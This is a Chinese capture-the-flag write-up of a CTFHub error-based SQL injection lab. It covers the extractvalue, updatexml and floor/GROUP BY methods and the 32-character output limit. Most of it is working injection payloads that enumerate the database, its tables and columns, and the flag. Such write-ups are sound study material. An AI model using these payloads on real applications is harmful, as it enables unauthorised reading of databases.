---
title: ctfhub报错型注入
categories:
      - ctfhub
      - sql注入
---
报错型SQL注入主要有三种方法:

1. extractvalue函数形成的xpath报错
2. updatexml函数形成的xpath报错
3. floor实现的group by主键重复

1、利用extractvalue来xpath报错。

extractvalue函数从目标xml文件中返回所包含查询值的字符串，语法为

```sql
extractvalue("XML_document","Xpath_string")
```

```sql
and (select extractvalue(1, concat(0x7e, (select database()))))

and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= 'sqli'))))

and (select extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name= 'flag'))))

and (select extractvalue(1, concat(0x7e, (select flag from flag))))

```

2、利用updatexml来xpath报错。

updatexml是修改xml文件的函数，标准语法为：

```sql
updatexml('XML_document','Xpath_string','New_value')
```

```sql
and (select updatexml(1, (concat (0x7e, (select database()))),1))

and (select updatexml(1, (concat (0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='sqli'))),1))

and (select updatexml(1, (concat (0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag'))),1))

and (select updatexml(1, concat(0x7e, (select flag from flag)), 1))

```

3、利用floor来group by主键重复报错。

```sql
union select count(*), concat((select database()), floor(rand(0)*2)) x from news group by x

union select count(*), concat((select table_name from information_schema.tables where table_schema='sqli' limit 1,1), floor(rand(0)*2)) x from news group by x

union select count(*), concat((select column_name from information_schema.columns where table_name='flag' limit 0,1), floor(rand(0)*2)) x from news group by x

union select count(*), concat((select flag from flag limit 0,1), floor(rand(0)*2)) x from news group by x


```


extractvalue和updatexml这两个函数得到的flag是不完整的。这两个函数的返回值最多只有32个字符。这里和最终的flag少了一个右大括号。

以后遇到这种问题再用一下right()获取右边的值即可。

用group by的时候问题很大，首先它貌似只试用于mysql 5.x的版本
